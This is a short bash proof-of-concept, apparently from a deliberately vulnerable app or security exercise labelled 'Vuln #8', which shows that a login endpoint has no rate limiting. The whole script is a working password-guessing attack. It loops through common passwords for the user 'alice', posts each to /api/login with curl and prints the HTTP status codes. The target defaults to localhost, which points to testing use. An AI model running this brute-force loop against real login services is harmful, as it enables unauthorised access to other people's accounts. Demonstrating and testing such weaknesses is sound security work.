#!/usr/bin/env bash
# Vuln #8: no login rate limit
set -euo pipefail
BASE="${1:-http://localhost:${PORT:-3000}}"
i=0
for GUESS in 123456 password qwerty alice letmein 111111 iloveyou admin welcome \
             monkey dragon sunshine princess alice123 alicepass; do
  i=$((i + 1))
  CODE=$(curl -sk -o /dev/null -w '%{http_code}' -X POST "$BASE/api/login" \
    -H 'Content-Type: application/json' \
    --data-raw "{\"username\":\"alice\",\"password\":\"$GUESS\"}")
  echo "attempt $i ($GUESS) -> HTTP $CODE"
done
